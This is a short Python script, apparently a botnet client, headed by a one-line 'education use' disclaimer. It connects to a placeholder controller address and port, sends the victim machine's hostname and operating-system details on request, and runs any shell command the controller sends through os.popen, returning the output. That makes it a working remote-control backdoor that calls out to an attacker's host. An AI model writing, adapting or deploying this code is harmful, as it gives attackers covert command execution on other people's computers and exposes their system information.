#This is just for education use don't use it for illegal purposes

import socket
import os

# The IP address and port of the main host
host = 'YOUR_MAIN_HOST_IP'
port = YOUR_MAIN_HOST_PORT

def connect_to_main_host():
    # Connect to the main host
    main_host = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    main_host.connect((host, port))

    # Send commands to the main host and receive instructions
    while True:
        command = main_host.recv(1024).decode()

        if command.lower() == 'exit':
            break
        elif command.lower() == 'get_system_info':
            system_info = get_system_info()
            main_host.send(system_info.encode())
        elif command.lower() == 'execute_command':
            cmd = main_host.recv(1024).decode()
            result = execute_command(cmd)
            main_host.send(result.encode())
        else:
            main_host.send('Invalid command'.encode())

    # Close the connection
    main_host.close()

def get_system_info():
    # Get system information such as hostname, operating system, etc.
    # Implement your own logic here
    system_info = "System Information:\n"
    system_info += "Hostname: {}\n".format(os.uname().nodename)
    system_info += "Operating System: {}\n".format(os.uname().sysname)
    system_info += "Release: {}\n".format(os.uname().release)
    system_info += "Version: {}\n".format(os.uname().version)
    return system_info

def execute_command(cmd):
    # Execute a command on the bot's system and return the result
    # Implement your own logic here
    result = os.popen(cmd).read()
    return result

def start_bot():
    # Connect to the main host
    connect_to_main_host()

# Start the bot
start_bot()
